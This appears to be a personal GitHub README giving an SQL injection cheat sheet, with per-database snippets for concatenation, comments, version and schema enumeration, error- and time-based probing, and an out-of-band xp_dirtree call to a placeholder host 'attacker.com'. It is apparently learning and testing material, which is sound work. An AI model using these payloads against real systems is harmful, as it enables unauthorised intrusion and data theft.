# 🛡️ SQL Injection Cheat Sheet

![SQLi](https://img.shields.io/badge/Cybersecurity-SQL%20Injection-red?style=for-the-badge)

---

## 📌 Cheat Sheet

### 🔗 String Concatenation

'foo' || 'bar' -- Oracle / PostgreSQL
'foo' + 'bar' -- SQL Server
CONCAT('foo','bar') -- MySQL


---

### ✂️ Substring

SUBSTR('foobar',4,2) -- Oracle
SUBSTRING('foobar',4,2) -- SQL Server / PostgreSQL / MySQL


---

### 💬 Comments

-- comment -- SQL Server / PostgreSQL / Oracle
/* comment */ -- All

comment -- MySQL

---

### 🧾 Database Version

SELECT @@version -- SQL Server / MySQL
SELECT version() -- PostgreSQL
SELECT banner FROM v$version -- Oracle


---

### 📂 Database Enumeration

SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns WHERE table_name='TABLE';


---

### ⚠️ Conditional Errors

SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END; -- SQL Server
SELECT pg_sleep(10) -- PostgreSQL delay test


---

### ⏱️ Time-Based Injection

WAITFOR DELAY '0:0:10' -- SQL Server
SELECT SLEEP(10) -- MySQL
SELECT pg_sleep(10) -- PostgreSQL


---

### 🌐 DNS Lookup (advanced)

exec master..xp_dirtree '//attacker.com/a' -- SQL Server


---

## 🚀 Notes
- Used for testing SQL Injection vulnerabilities
- Works across major database engines
- Common in OWASP Top 10 security flaws

---

## 👨‍💻 Author
DJ — Cybersecurity Learner | Homelab Builder | Future Security Engineer
